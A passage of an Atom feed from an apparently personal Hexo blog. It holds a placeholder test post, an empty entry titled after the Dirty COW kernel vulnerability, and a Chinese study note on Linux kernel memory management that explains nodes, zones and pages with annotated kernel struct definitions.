<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C7</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://billyotry.github.io/"/>
  <updated>2021-02-28T13:21:57.128Z</updated>
  <id>https://billyotry.github.io/</id>
  
  <author>
    <name>C7</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>这是标题</title>
    <link href="https://billyotry.github.io/2099/01/01/test/"/>
    <id>https://billyotry.github.io/2099/01/01/test/</id>
    <published>2098-12-31T16:00:00.000Z</published>
    <updated>2021-02-28T13:21:57.128Z</updated>
    
    <content type="html"><![CDATA[<p><strong>just a test</strong></p><p> <img src="https://inews.gtimg.com/newsapp_ls/0/13071917630/0" alt="backgroud"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;just a test&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://inews.gtimg.com/newsapp_ls/0/13071917630/0&quot; alt=&quot;backgroud&quot;&gt;&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2016-5195 Dirtycow Linux内核提权漏洞</title>
    <link href="https://billyotry.github.io/2021/04/17/CVE-2016-5195%20Dirtycow%20Linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>https://billyotry.github.io/2021/04/17/CVE-2016-5195%20Dirtycow%20Linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-17T07:35:32.642Z</published>
    <updated>2021-04-17T07:37:32.777Z</updated>
    
    <content type="html"><![CDATA[<p>a</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;a&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="Learning" scheme="https://billyotry.github.io/categories/Learning/"/>
    
    
      <category term="Linux" scheme="https://billyotry.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux内核-内存管理学习</title>
    <link href="https://billyotry.github.io/2021/04/15/Linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0/"/>
    <id>https://billyotry.github.io/2021/04/15/Linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-04-15T03:46:22.581Z</published>
    <updated>2021-04-16T13:57:21.713Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux内核对物理内存描述"><a href="#Linux内核对物理内存描述" class="headerlink" title="Linux内核对物理内存描述"></a>Linux内核对物理内存描述</h2><p>Linux将物理内存按固定大小的页面（一般为4K）划分内存，在内核初始化的时候，会建立一个<strong>全局struct page结构数组mem_map</strong>。数组中的每个元素与物理内存页面一一对应，整个数组就代表着系统中的全部物理页面。Linux将NUMA中内存访问速度一致的部分称为一个节点（Node），用<code>struct pglist_data</code>数据结构表示，通常使用时用它的typedef定义<code>pg_data_t</code>。系统中的每个结点都通过<code>pgdat_list</code>链表<code>pg_data_t -&gt; node_next</code>连接起来，该连接以NULL为结束标志。</p><p>每个结点又进一步分为许多块，称为区域（zones）。区域标识内存中的一块范围。区域用<code>struct zone_struct</code>数据结构表示，它的typedef定义为<code>zone_t</code>。</p><p>每个区域（zone）中有多个页面（Pages）组成。节点、区域、页面三者关系如下图：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13415667082/0" alt="image-20210416002829877"></p><h3 id="节点（Node）"><a href="#节点（Node）" class="headerlink" title="节点（Node）"></a>节点（Node）</h3><p>节点（Node），在linux中用<code>struct pglist_data</code>数据结构表示，通常使用时它的typedef定义<code>pg_data_t</code>，数据结构定义在文件<code>include/linux/mmzone.h</code>中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On NUMA machines, each NUMA node would have a pg_data_t to describe</span></span><br><span class="line"><span class="comment"> * it&#x27;s memory layout. On UMA machines there is a single pglist_data which</span></span><br><span class="line"><span class="comment"> * describes the whole memory.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Memory statistics and page replacement data structures are maintained on a</span></span><br><span class="line"><span class="comment"> * per-zone basis.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node_zones contains just the zones for THIS node. Not all of the</span></span><br><span class="line"><span class="comment"> * zones may be populated, but it is the full list. It is referenced by</span></span><br><span class="line"><span class="comment"> * this node&#x27;s node_zonelists as well as other node&#x27;s node_zonelists.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这个节点的区域</span></span><br><span class="line">    <span class="comment">// 在x86中有 ZONE_HIGHMEM,ZONE_NORMAL,ZONE_DMA</span></span><br><span class="line">    <span class="comment">// 在X86_64中有 DMA,DMA32,NORMAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node_zonelists contains references to all zones in all nodes.</span></span><br><span class="line"><span class="comment"> * Generally the first zones will be references to this node&#x27;s</span></span><br><span class="line"><span class="comment"> * node_zones.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分配区域时的顺序</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 区域的数量，一般来说值的范围为1~3，但并不是所有的节点都有三个区域</span></span><br><span class="line"><span class="keyword">int</span> nr_zones; <span class="comment">/* number of populated zones in this node */</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP<span class="comment">/* means !SPARSEMEM */</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 该节点的第一个页面在全局变量mem_map数组中的地址</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Must be held any time you expect node_start_pfn,</span></span><br><span class="line"><span class="comment"> * node_present_pages, node_spanned_pages or nr_zones to stay constant.</span></span><br><span class="line"><span class="comment"> * Also synchronizes pgdat-&gt;first_deferred_pfn during deferred page</span></span><br><span class="line"><span class="comment"> * init.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * pgdat_resize_lock() and pgdat_resize_unlock() are provided to</span></span><br><span class="line"><span class="comment"> * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment"> * or CONFIG_DEFERRED_STRUCT_PAGE_INIT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Nests above zone-&gt;lock and zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 该节点的起始物理页面号</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_start_pfn;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 该节点中的总共页面数</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_present_pages; <span class="comment">/* total number of physical pages */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 该节点中的所有物理页面数，包括内存空洞(如部分地址为外设I/O使用)</span></span><br><span class="line">    <span class="comment">// 个人认为与上者的区别是这里包括了不能用的物理页</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_spanned_pages; <span class="comment">/* total size of physical page</span></span><br><span class="line"><span class="comment">     range, including holes */</span></span><br><span class="line"><span class="comment">// 节点ID，从0开始</span></span><br><span class="line">    <span class="keyword">int</span> node_id;</span><br><span class="line"><span class="keyword">wait_queue_head_t</span> kswapd_wait;</span><br><span class="line"><span class="keyword">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span><span class="comment">/* Protected by</span></span><br><span class="line"><span class="comment">   mem_hotplug_begin/end() */</span></span><br><span class="line"><span class="keyword">int</span> kswapd_order;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kswapd_highest_zoneidx</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> kswapd_failures;<span class="comment">/* Number of &#x27;reclaimed == 0&#x27; runs */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line"><span class="keyword">int</span> kcompactd_max_order;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_highest_zoneidx</span>;</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a per-node reserve of pages that are not available</span></span><br><span class="line"><span class="comment"> * to userspace allocations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node reclaim becomes active if more unmapped pages exist.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>min_unmapped_pages;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write-intensive fields used by page reclaim */</span></span><br><span class="line">ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If memory initialisation on large machines is deferred then this</span></span><br><span class="line"><span class="comment"> * is the first PFN that needs to be initialised.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">deferred_split</span> <span class="title">deferred_split_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> THIS IS UNUSED IF MEMCG IS ENABLED.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Use mem_cgroup_lruvec() to look up lruvecs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>__<span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"></span><br><span class="line">ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Per-node vmstats */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_nodestat</span> __<span class="title">percpu</span> *<span class="title">per_cpu_nodestats</span>;</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_stat[NR_VM_NODE_STAT_ITEMS];</span><br><span class="line">&#125; <span class="keyword">pg_data_t</span>;</span><br></pre></td></tr></table></figure><p>当分配一个页面时，Linux使用本地节点分配策略，从运行的CPU最近的一个节点分配，因为进程倾向于在同一个CPU上运行，使用内存时也就更可能使用本节点的空间。</p><h3 id="区域（Zone）"><a href="#区域（Zone）" class="headerlink" title="区域（Zone）"></a>区域（Zone）</h3><h4 id="区域类型"><a href="#区域类型" class="headerlink" title="区域类型"></a>区域类型</h4><p>节点（Node）下面可以有多个区域，共有以下几种类型：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_DMA and ZONE_DMA32 are used when there are peripherals not able</span></span><br><span class="line"><span class="comment"> * to DMA to all of the addressable memory (ZONE_NORMAL).</span></span><br><span class="line"><span class="comment"> * On architectures where this area covers the whole 32 bit address</span></span><br><span class="line"><span class="comment"> * space ZONE_DMA32 is used. ZONE_DMA is left for the ones with smaller</span></span><br><span class="line"><span class="comment"> * DMA addressing constraints. This distinction is important as a 32bit</span></span><br><span class="line"><span class="comment"> * DMA mask is assumed when ZONE_DMA32 is defined. Some 64-bit</span></span><br><span class="line"><span class="comment"> * platforms may need both zones as they support peripherals with</span></span><br><span class="line"><span class="comment"> * different DMA addressing limitations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">ZONE_DMA,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA32</span></span><br><span class="line">ZONE_DMA32,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Normal addressable memory is in ZONE_NORMAL. DMA operations can be</span></span><br><span class="line"><span class="comment"> * performed on pages in ZONE_NORMAL if the DMA devices support</span></span><br><span class="line"><span class="comment"> * transfers to all addressable memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A memory area that is only addressable by the kernel through</span></span><br><span class="line"><span class="comment"> * mapping portions into its own address space. This is for example</span></span><br><span class="line"><span class="comment"> * used by i386 to allow the kernel to address the memory beyond</span></span><br><span class="line"><span class="comment"> * 900MB. The kernel will set up special mappings (page</span></span><br><span class="line"><span class="comment"> * table entries on i386) for each page that the kernel needs to</span></span><br><span class="line"><span class="comment"> * access.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_HIGHMEM,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE is similar to ZONE_NORMAL, except that it contains</span></span><br><span class="line"><span class="comment"> * movable pages with few exceptional cases described below. Main use</span></span><br><span class="line"><span class="comment"> * cases for ZONE_MOVABLE are to make memory offlining/unplug more</span></span><br><span class="line"><span class="comment"> * likely to succeed, and to locally limit unmovable allocations - e.g.,</span></span><br><span class="line"><span class="comment"> * to increase the number of THP/huge pages. Notable special cases are:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1. Pinned pages: (long-term) pinning of movable pages might</span></span><br><span class="line"><span class="comment"> *    essentially turn such pages unmovable. Memory offlining might</span></span><br><span class="line"><span class="comment"> *    retry a long time.</span></span><br><span class="line"><span class="comment"> * 2. memblock allocations: kernelcore/movablecore setups might create</span></span><br><span class="line"><span class="comment"> *    situations where ZONE_MOVABLE contains unmovable allocations</span></span><br><span class="line"><span class="comment"> *    after boot. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment"> * 3. Memory holes: kernelcore/movablecore setups might create very rare</span></span><br><span class="line"><span class="comment"> *    situations where ZONE_MOVABLE contains memory holes after boot,</span></span><br><span class="line"><span class="comment"> *    for example, if we have sections that are only partially</span></span><br><span class="line"><span class="comment"> *    populated. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment"> * 4. PG_hwpoison pages: while poisoned pages can be skipped during</span></span><br><span class="line"><span class="comment"> *    memory offlining, such pages cannot be allocated.</span></span><br><span class="line"><span class="comment"> * 5. Unmovable PG_offline pages: in paravirtualized environments,</span></span><br><span class="line"><span class="comment"> *    hotplugged memory blocks might only partially be managed by the</span></span><br><span class="line"><span class="comment"> *    buddy (e.g., via XEN-balloon, Hyper-V balloon, virtio-mem). The</span></span><br><span class="line"><span class="comment"> *    parts not manged by the buddy are unmovable PG_offline pages. In</span></span><br><span class="line"><span class="comment"> *    some cases (virtio-mem), such pages can be skipped during</span></span><br><span class="line"><span class="comment"> *    memory offlining, however, cannot be moved/allocated. These</span></span><br><span class="line"><span class="comment"> *    techniques might use alloc_contig_range() to hide previously</span></span><br><span class="line"><span class="comment"> *    exposed pages from the buddy again (e.g., to implement some sort</span></span><br><span class="line"><span class="comment"> *    of memory unplug in virtio-mem).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In general, no unmovable allocations that degrade memory offlining</span></span><br><span class="line"><span class="comment"> * should end up in ZONE_MOVABLE. Allocators (like alloc_contig_range())</span></span><br><span class="line"><span class="comment"> * have to expect that migrating pages in ZONE_MOVABLE can fail (even</span></span><br><span class="line"><span class="comment"> * if has_unmovable_pages() states that there are no unmovable pages,</span></span><br><span class="line"><span class="comment"> * there can be false negatives).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_MOVABLE,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DEVICE</span></span><br><span class="line">ZONE_DEVICE,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">__MAX_NR_ZONES</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>ZONE_DMA</strong></p><p>是低内存的一块区域，这块区域由标准工业架构设备使用，适合DMA内存。这部分内存大小和CPU架构有关，在x86架构中，该部分区域大小限制为16MB。</p><p><strong>ZONE_DMA32</strong></p><p>该部分区域为适合支持32位地址总线的DMA内存空间。很显然，该部分仅在64位系统有效，在32位系统中，这部分区域为空。在x86-64架构中，这部分的区域范围为0~4GB。</p><p><strong>ZONE_NORMAL</strong></p><p>属于<code>ZONE_NORMAL</code>的内存被内核直接映射到线性地址。这部分区域仅表示可能存在这部分区域，如在64位系统中，若系统只有4GB物理内存，则所有的物理内存都属于<code>ZONE_DMA32</code>，而<code>ZONE_NORMAL</code>区域为空。</p><p>许多内核操作都仅在<code>ZONE_NORMAL</code>内存区域进行，所以这部分是系统性能关键的地方。</p><p><strong>ZONE_HIGHMEM</strong></p><p>是系统中剩下的可用内存，但因为内核的地址空间有限，这部分内存不直接映射到内核。</p><p>在x86架构中内存有三种区域：<code>ZONE_DMA</code>,<code>ZONE_NORMAL</code>,<code>ZONE_HIGHMEM</code>。不同类型的区域适合不同需要。在32位系统结构中，1G(内核空间) / 3G(内核空间)地址空间划分时，三种类型的区域如下：</p><ul><li><strong>ZONE_DMA</strong>：内存开始的16MB</li><li><strong>ZONE_NORMAL</strong>：16MB~896MB</li><li><strong>ZONE_HIGHMEM</strong>：896~结束</li></ul><p>4G(内核空间) / 4G(用户空间)地址空间划分时，三种类型区域划分为：</p><ul><li><strong>ZONE_DMA</strong>：内存开始的16MB</li><li><strong>ZONE_NORMAL</strong>：16MB~3968MB</li><li><strong>ZONE_HIGHMEM</strong>：3968MB~结束</li></ul><p>对于64位系统中，不存在高端内存，这里个人的理解是64位系统中，线性地址能达到2^64B这么多，就算是物理地址一一对应来映射，也能够访问到所有的物理地址。之所以出现高端内存是因为我们的虚拟地址不足以映射所有的物理地址，此时如果一一映射，那么我们就没法访问到所有的物理内存。下图为32为和64位系统中内存区域划分区别</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13417851569/0" alt="image-20210416155935255"></p><h4 id="struct-zone结构体"><a href="#struct-zone结构体" class="headerlink" title="struct zone结构体"></a>struct zone结构体</h4><p>每块区域的描述结构为<code>struct zone</code>。<code>zone</code>跟踪一些信息，如页面的使用统计、空闲页面及锁等，数据结构定义在文件<code>include/linux/mmzone.h</code>中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line"><span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone watermarks, access with *_wmark_pages(zone) macros */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _watermark[NR_WMARK];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> watermark_boost;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We don&#x27;t know if the memory that we&#x27;re going to allocate will be</span></span><br><span class="line"><span class="comment"> * freeable or/and it will be released eventually, so to avoid totally</span></span><br><span class="line"><span class="comment"> * wasting several GB of ram we must reserve some of the lower zone</span></span><br><span class="line"><span class="comment"> * memory (otherwise we risk to run OOM on the lower zones despite</span></span><br><span class="line"><span class="comment"> * there being tons of freeable ram on the higher zones).  This array is</span></span><br><span class="line"><span class="comment"> * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl</span></span><br><span class="line"><span class="comment"> * changes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">// 针对每个区域保存的物理页面数量，保证在任何条件下，申请内存都不会失败</span></span><br><span class="line"><span class="keyword">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="keyword">int</span> node;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 指向父亲pg_data_t</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>*<span class="title">zone_pgdat</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * the high and batch values are copied to individual pagesets for</span></span><br><span class="line"><span class="comment"> * faster access</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> pageset_high;</span><br><span class="line"><span class="keyword">int</span> pageset_batch;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Flags for a pageblock_nr_pages block. See pageblock-flags.h.</span></span><br><span class="line"><span class="comment"> * In SPARSEMEM, this map is stored in struct mem_section</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>*pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span></span><br><span class="line">    <span class="comment">// 该区域节点的物理页面号</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>zone_start_pfn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * spanned_pages is the total pages spanned by the zone, including</span></span><br><span class="line"><span class="comment"> * holes, which is calculated as:</span></span><br><span class="line"><span class="comment"> * spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * present_pages is physical pages existing within the zone, which</span></span><br><span class="line"><span class="comment"> * is calculated as:</span></span><br><span class="line"><span class="comment"> *present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * managed_pages is present pages managed by the buddy system, which</span></span><br><span class="line"><span class="comment"> * is calculated as (reserved_pages includes pages allocated by the</span></span><br><span class="line"><span class="comment"> * bootmem allocator):</span></span><br><span class="line"><span class="comment"> *managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * cma pages is present pages that are assigned for CMA use</span></span><br><span class="line"><span class="comment"> * (MIGRATE_CMA).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * So present_pages may be used by memory hotplug or memory power</span></span><br><span class="line"><span class="comment"> * management logic to figure out unmanaged pages by checking</span></span><br><span class="line"><span class="comment"> * (present_pages - managed_pages). And managed_pages should be used</span></span><br><span class="line"><span class="comment"> * by page allocator and vm scanner to calculate all kinds of watermarks</span></span><br><span class="line"><span class="comment"> * and thresholds.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Locking rules:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * zone_start_pfn and spanned_pages are protected by span_seqlock.</span></span><br><span class="line"><span class="comment"> * It is a seqlock because it has to be read outside of zone-&gt;lock,</span></span><br><span class="line"><span class="comment"> * and it is done in the main allocator path.  But, it is written</span></span><br><span class="line"><span class="comment"> * quite infrequently.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The span_seq lock is declared along with zone-&gt;lock because it is</span></span><br><span class="line"><span class="comment"> * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to</span></span><br><span class="line"><span class="comment"> * give them a chance of being in the same cacheline.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Write access to present_pages at runtime should be protected by</span></span><br><span class="line"><span class="comment"> * mem_hotplug_begin/end(). Any reader who can&#x27;t tolerant drift of</span></span><br><span class="line"><span class="comment"> * present_pages should get_online_mems() to get a stable value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>managed_pages;</span><br><span class="line">    <span class="comment">// 所有物理页面数，包括内存空洞</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>spanned_pages;</span><br><span class="line">    <span class="comment">// 总共页面数，不包括内存空洞</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>present_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>cma_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">// 区域的名字 &quot;DMA&quot;,&quot;DMA32&quot;,&quot;NORMAL&quot;,&quot;HIGHMEM&quot;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Number of isolated pageblock. It is used to solve incorrect</span></span><br><span class="line"><span class="comment"> * freepage counting problem due to racy retrieving migratetype</span></span><br><span class="line"><span class="comment"> * of pageblock. Protected by zone-&gt;lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment">/* see spanned/present_pages for more description */</span></span><br><span class="line"><span class="keyword">seqlock_t</span>span_seqlock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> initialized;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 